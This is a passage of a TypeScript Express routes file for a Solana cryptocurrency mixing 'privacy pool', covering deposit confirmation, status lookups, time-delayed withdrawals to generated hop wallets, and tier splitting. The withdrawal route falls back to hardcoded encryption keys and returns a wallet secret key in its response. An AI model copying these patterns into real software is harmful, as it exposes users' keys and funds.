        return res.status(400).json({ error: 'Missing depositId or txSignature' });
      }

      // Get deposit record
      const [deposit] = await db.select()
        .from(zkPoolDeposits)
        .where(and(
          eq(zkPoolDeposits.id, depositId),
          eq(zkPoolDeposits.sessionId, sessionId)
        ))
        .limit(1);

      if (!deposit) {
        return res.status(404).json({ error: 'Deposit not found' });
      }

      if (deposit.status !== 'pending') {
        return res.status(400).json({ error: `Deposit already ${deposit.status}` });
      }

      // Verify on-chain
      const { verifyDepositTransaction, DEPOSIT_TIERS } = await import('./lib/zk/depositPool');
      const tierConfig = DEPOSIT_TIERS[deposit.tier as keyof typeof DEPOSIT_TIERS];
      
      const verification = await verifyDepositTransaction(
        txSignature,
        tierConfig.lamports,
        deposit.commitmentHash
      );

      if (!verification.verified) {
        await db.update(zkPoolDeposits)
          .set({ 
            status: 'failed', 
            errorMessage: verification.error 
          })
          .where(eq(zkPoolDeposits.id, depositId));
        
        return res.status(400).json({ 
          success: false, 
          error: verification.error 
        });
      }

      // Update status to deposited (queued for withdrawal)
      await db.update(zkPoolDeposits)
        .set({ 
          status: 'queued',
          depositedAt: new Date(),
          depositTxSignature: txSignature,
        })
        .where(eq(zkPoolDeposits.id, depositId));

      res.json({
        success: true,
        status: 'queued',
        withdrawAfter: deposit.withdrawAfter,
        message: `Deposit confirmed. Withdrawal will be available after ${deposit.withdrawAfter?.toISOString()}`,
      });
    } catch (error: any) {
      console.error('Confirm deposit error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Get deposit status
  app.get('/api/privacy-pool/status/:depositId', async (req, res) => {
    try {
      const sessionId = getOrCreateAnonymousId(req.session);
      const { depositId } = req.params;

      const [deposit] = await db.select()
        .from(zkPoolDeposits)
        .where(and(
          eq(zkPoolDeposits.id, depositId),
          eq(zkPoolDeposits.sessionId, sessionId as string)
        ))
        .limit(1);

      if (!deposit) {
        return res.status(404).json({ error: 'Deposit not found' });
      }

      // Check if ready for withdrawal
      const now = new Date();
      const withdrawReady = deposit.withdrawAfter && now >= deposit.withdrawAfter;
      const timeRemaining = deposit.withdrawAfter 
        ? Math.max(0, deposit.withdrawAfter.getTime() - now.getTime()) 
        : 0;

      res.json({
        id: deposit.id,
        status: deposit.status,
        tier: deposit.tier,
        amountSol: deposit.amountSol,
        destinationAddress: deposit.destinationAddress,
        withdrawReady,
        timeRemaining: Math.ceil(timeRemaining / 1000),
        withdrawAfter: deposit.withdrawAfter?.toISOString(),
        depositedAt: deposit.depositedAt?.toISOString(),
        withdrawnAt: deposit.withdrawnAt?.toISOString(),
        errorMessage: deposit.errorMessage,
      });
    } catch (error: any) {
      console.error('Get deposit status error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Get all pending deposits for session
  app.get('/api/privacy-pool/deposits', async (req, res) => {
    try {
      const sessionId = getOrCreateAnonymousId(req.session);
      if (!sessionId) {
        return res.status(401).json({ error: 'Session required' });
      }

      const deposits = await db.select()
        .from(zkPoolDeposits)
        .where(eq(zkPoolDeposits.sessionId, sessionId))
        .orderBy(zkPoolDeposits.createdAt);

      const now = new Date();
      res.json(deposits.map(d => ({
        id: d.id,
        status: d.status,
        tier: d.tier,
        amountSol: d.amountSol,
        destinationAddress: d.destinationAddress,
        withdrawReady: d.withdrawAfter && now >= d.withdrawAfter,
        timeRemaining: d.withdrawAfter 
          ? Math.max(0, Math.ceil((d.withdrawAfter.getTime() - now.getTime()) / 1000))
          : 0,
        withdrawAfter: d.withdrawAfter?.toISOString(),
        createdAt: d.createdAt.toISOString(),
      })));
    } catch (error: any) {
      console.error('Get deposits error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Initiate withdrawal from privacy pool (triggers ZK proof + multi-hop)
  app.post('/api/privacy-pool/withdraw', zkLimiter, async (req, res) => {
    try {
      const sessionId = getOrCreateAnonymousId(req.session);
      const { depositId, note } = req.body;

      if (!depositId) {
        return res.status(400).json({ error: 'Missing depositId' });
      }

      // Get deposit record
      const [deposit] = await db.select()
        .from(zkPoolDeposits)
        .where(and(
          eq(zkPoolDeposits.id, depositId),
          eq(zkPoolDeposits.sessionId, sessionId)
        ))
        .limit(1);

      if (!deposit) {
        return res.status(404).json({ error: 'Deposit not found' });
      }

      if (deposit.status !== 'queued') {
        return res.status(400).json({ 
          error: `Cannot withdraw: deposit status is ${deposit.status}` 
        });
      }

      // Check if anonymity delay has passed
      const now = new Date();
      if (deposit.withdrawAfter && now < deposit.withdrawAfter) {
        const remaining = Math.ceil((deposit.withdrawAfter.getTime() - now.getTime()) / 1000);
        return res.status(400).json({ 
          error: 'Anonymity delay not elapsed',
          timeRemaining: remaining,
          withdrawAfter: deposit.withdrawAfter.toISOString(),
        });
      }

      // Decrypt note if not provided
      let depositNote = note;
      if (!depositNote) {
        const CryptoJSModule = await import('crypto-js');
        const CryptoJS = CryptoJSModule.default || CryptoJSModule;
        const encryptionKey = process.env.WALLET_ENCRYPTION_KEY || 'default-key';
        try {
          const decrypted = CryptoJS.AES.decrypt(deposit.encryptedNote, encryptionKey);
          depositNote = JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
        } catch {
          return res.status(400).json({ error: 'Failed to decrypt note. Please provide note.' });
        }
      }

      // Update status to withdrawing
      await db.update(zkPoolDeposits)
        .set({ status: 'withdrawing' })
        .where(eq(zkPoolDeposits.id, depositId));

      // Generate hop wallet 0 (withdrawal recipient)
      const { Keypair } = await import('@solana/web3.js');
      const hopWallet0 = Keypair.generate();
      const bs58 = await import('bs58');
      
      // CRITICAL: Save hop wallet 0 to recovery BEFORE sending any funds
      // This ensures we can recover the wallet if the client loses the key
      const CryptoJS = await import('crypto-js');
      const encryptionKey = process.env.WALLET_ENCRYPTION_KEY || 'zmix-dev-key';
      const hopWallet0Data = [{
        publicKey: hopWallet0.publicKey.toBase58(),
        secretKey: bs58.default.encode(hopWallet0.secretKey),
      }];
      const encryptedHopWallet0 = CryptoJS.default.AES.encrypt(
        JSON.stringify(hopWallet0Data),
        encryptionKey
      ).toString();
      
      // Create a recovery record for the pool withdrawal recipient wallet
      // Use the deposit ID as the mix session ID for tracking
      await db.insert(hopWalletRecovery).values({
        sessionId,
        mixSessionId: depositId, // Link to the deposit being withdrawn
        encryptedKeys: encryptedHopWallet0,
        hopCount: 1,
        status: 'pending',
        expiresAt: new Date(Date.now() + 48 * 60 * 60 * 1000), // 48 hour expiry for pool withdrawals
      });
      
      console.log(`Saved hop wallet 0 to recovery: ${hopWallet0.publicKey.toBase58()} for deposit ${depositId}`);

      // Process withdrawal through the ZK pool
      const { processWithdrawal, isNullifierSpent } = await import('./lib/zk/depositPool');

      // Check nullifier
      const nullifierHash = depositNote.nullifierHash;
      const alreadySpent = await isNullifierSpent(nullifierHash);
      if (alreadySpent) {
        await db.update(zkPoolDeposits)
          .set({ status: 'failed', errorMessage: 'Nullifier already spent' })
          .where(eq(zkPoolDeposits.id, depositId));
        return res.status(400).json({ error: 'Deposit already withdrawn (double-spend attempt)' });
      }

      // Process withdrawal (generates proof, calculates fees)
      const withdrawResult = await processWithdrawal(
        depositNote,
        hopWallet0.publicKey.toBase58()
      );

      if (!withdrawResult.success) {
        await db.update(zkPoolDeposits)
          .set({ status: 'failed', errorMessage: withdrawResult.error })
          .where(eq(zkPoolDeposits.id, depositId));
        return res.status(500).json({ error: withdrawResult.error });
      }

      // ACTUALLY EXECUTE THE WITHDRAWAL - send SOL from pool to hop wallet
      const { executeWithdrawalTransaction } = await import('./lib/zk/depositPool');
      const amountLamports = BigInt(Math.floor(parseFloat(withdrawResult.amountReceived!) * 1e9));
      const platformFeeLamports = BigInt(Math.floor(parseFloat(withdrawResult.platformFee!) * 1e9));
      
      const poolPrivateKey = process.env.POOL_PRIVATE_KEY;
      if (!poolPrivateKey) {
        await db.update(zkPoolDeposits)
          .set({ status: 'failed', errorMessage: 'Pool private key not configured' })
          .where(eq(zkPoolDeposits.id, depositId));
        return res.status(500).json({ error: 'Pool not configured for withdrawals' });
      }

      const txResult = await executeWithdrawalTransaction(
        hopWallet0.publicKey.toBase58(),
        amountLamports,
        platformFeeLamports,
        poolPrivateKey
      );

      if (!txResult.success) {
        await db.update(zkPoolDeposits)
          .set({ status: 'failed', errorMessage: txResult.error })
          .where(eq(zkPoolDeposits.id, depositId));
        return res.status(500).json({ error: `Withdrawal transaction failed: ${txResult.error}` });
      }

      console.log(`Pool withdrawal executed: ${txResult.signature} - ${withdrawResult.amountReceived} SOL to ${hopWallet0.publicKey.toBase58()}`);

      // Record withdrawal with transaction signature
      const [withdrawal] = await db.insert(zkPoolWithdrawals).values({
        depositId,
        sessionId,
        nullifierHash,
        recipientAddress: hopWallet0.publicKey.toBase58(),
        amountReceived: withdrawResult.amountReceived,
        platformFee: withdrawResult.platformFee,
        relayerFee: withdrawResult.relayerFee,
        withdrawalTxSignature: txResult.signature,
        status: 'completed',
      }).returning();

      // Update deposit as withdrawn
      await db.update(zkPoolDeposits)
        .set({ 
          status: 'withdrawn',
          withdrawnAt: new Date(),
        })
        .where(eq(zkPoolDeposits.id, depositId));

      // Return hop wallet for multi-hop execution
      res.json({
        success: true,
        withdrawalId: withdrawal.id,
        hopWallet: {
          publicKey: hopWallet0.publicKey.toBase58(),
          secretKey: bs58.default.encode(hopWallet0.secretKey),
        },
        amountReceived: withdrawResult.amountReceived,
        platformFee: withdrawResult.platformFee,
        relayerFee: withdrawResult.relayerFee,
        destinationAddress: deposit.destinationAddress,
        message: 'Withdrawal processed. Execute multi-hop chain from hopWallet to destinationAddress.',
      });
    } catch (error: any) {
      console.error('Privacy pool withdraw error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Calculate optimal deposit tiers for an amount
  app.post('/api/privacy-pool/calculate-tiers', async (req, res) => {
    try {
      const { amountSol } = req.body;
      
      if (!amountSol || amountSol <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
      }

      const { DEPOSIT_TIERS } = await import('./lib/zk/depositPool');
      
      // Greedy decomposition into available tiers
      const tiers = Object.entries(DEPOSIT_TIERS)
        .map(([key, config]) => ({ tier: key, sol: config.sol, label: config.label }))
        .sort((a, b) => b.sol - a.sol); // Sort descending

      let remaining = parseFloat(amountSol);
      const deposits: Array<{ tier: string; sol: number; label: string }> = [];
      
      for (const tierConfig of tiers) {
        while (remaining >= tierConfig.sol && tierConfig.sol >= 0.1) {
          deposits.push(tierConfig);
          remaining = Math.round((remaining - tierConfig.sol) * 1e9) / 1e9; // Avoid floating point issues
        }
      }

      const totalDepositable = deposits.reduce((sum, d) => sum + d.sol, 0);
      const remainder = Math.round(remaining * 1e9) / 1e9;

      res.json({
        deposits,
        totalDepositable,
        remainder,
        message: remainder > 0 
          ? `${remainder} SOL cannot be deposited (below minimum tier)`
          : 'Full amount can be deposited',
      });
    } catch (error: any) {
      console.error('Calculate tiers error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
